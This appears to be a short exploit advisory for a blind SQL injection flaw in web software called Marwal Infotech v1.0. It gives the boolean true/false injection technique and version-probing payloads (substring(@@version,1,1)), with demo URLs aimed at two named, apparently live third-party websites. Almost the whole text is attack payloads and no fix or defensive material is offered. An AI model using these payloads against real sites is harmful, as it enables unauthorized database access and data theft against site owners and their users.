## Marwal Infotech - Blind Sql Injection Vulnerability

#### vender:https://marwalinfotech.com/

#### Software:Marwal Infotech v1.0

- Category:webapps
- Tested On: mac, Firefox
- [+] First add "and true" and then "and false" to the end of the link :

* Target.com/index.php?lang=1 true
* Target.com/index.php?lang=1 false

### Demo 1:
* https://www.tagorettcollege.com/page.php?id=23%20and%20true--
* https://www.tagorettcollege.com/page.php?id=23%20and%20false--
* https://www.tagorettcollege.com/page.php?id=23%20and%20substring(@@version,1,1)=1--
### Demo 2:
* https://www.gpsgotan.co.in/page.php?id=61%20and%20true--
* https://www.gpsgotan.co.in/page.php?id=61%20and%20false--
* https://www.gpsgotan.co.in/page.php?id=61%20and%20substring(@@version,1,1)=1--